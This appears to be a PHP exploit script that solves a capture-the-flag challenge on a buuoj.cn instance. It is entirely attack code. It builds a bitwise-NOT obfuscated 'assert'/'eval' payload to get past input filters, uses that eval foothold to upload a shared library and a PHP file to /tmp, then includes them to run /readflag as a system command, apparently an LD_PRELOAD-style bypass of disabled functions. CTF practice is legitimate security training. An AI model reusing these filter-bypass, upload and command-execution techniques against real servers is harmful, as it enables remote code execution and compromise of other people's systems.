<?php

function get($url, $param) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url . '?' . http_build_query($param),
        CURLOPT_RETURNTRANSFER => true,
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function post($url, $param, $data) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url . '?' . http_build_query($param),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function eval_get() {
    $cmd = ~'assert';
    $param = ~'eval($_GET["eval"])';
    return '(~"'. $cmd .'")(~"'. $param .'");';
}

$url = 'http://8c86ce6f-09eb-432e-9b9d-6cda12da86be.node4.buuoj.cn:81/';

$upload_snippet = '
if (isset($_FILES)) {
    foreach ($_FILES as $f) {
        move_uploaded_file($f["tmp_name"], "/tmp/" . $f["name"]);
        echo "uploaded /tmp/" . $f["name"] . PHP_EOL;
    }
}';

$post_param = [
    'code' => eval_get(),
    'eval' => $upload_snippet
];

$post_data = [
    'a' => new CURLFile('preload.so'),
    'b' => new CURLFile('preload.php')
];

echo post($url, $post_param, $post_data);

$post_param = [
    'code' => eval_get(),
    'eval' => 'include "/tmp/preload.php";',
    'cmd' => '/readflag > /tmp/output',
    'outpath' => '/tmp/output'
];

echo get($url, $post_param);